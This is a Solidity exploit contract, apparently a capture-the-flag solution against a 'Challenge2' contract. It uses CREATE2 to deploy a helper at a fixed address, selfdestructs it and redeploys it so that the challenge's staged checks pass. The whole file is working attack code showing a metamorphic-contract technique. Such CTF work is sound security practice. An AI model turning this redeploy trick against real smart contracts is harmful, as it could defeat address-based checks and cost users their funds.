// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import './Challenge2.sol';
import '@openzeppelin/contracts-3/utils/Create2.sol';

contract Exploit {
    Challenge2 challenge;
    ExploitHelper helper;
    
    constructor(Challenge2 _challenge) payable {
        challenge = _challenge;
    }

    function deploy() public {
        bytes memory bytecode = abi.encodePacked(type(ExploitHelper).creationCode, abi.encode(challenge));
        helper = ExploitHelper(payable(Create2.deploy(0, bytes32(0x0), bytecode)));
    }

    function destroy() public {
        helper.exploit();
    }

}

contract ExploitHelper is ICalled {
    Challenge2 challenge;
    constructor(Challenge2 _challenge) payable {
        challenge = _challenge;
        if (challenge.state() == Challenge2.State.THREE)
        {
            challenge.third();
        }
        else
        {
            challenge.first();
        }
    }

    function exploit() public {
        if (challenge.state() == Challenge2.State.TWO)
        {
            challenge.second();
        }
        else
        {
            challenge.fourth();
        }
        selfdestruct(payable(msg.sender));
    }

    function sup() external override returns (uint256){
        if (challenge.state() == Challenge2.State.TWO)
        {
            return 1337;
        }
        else
        {
            return 80085;
        }
    }

    fallback() external payable {

    }
}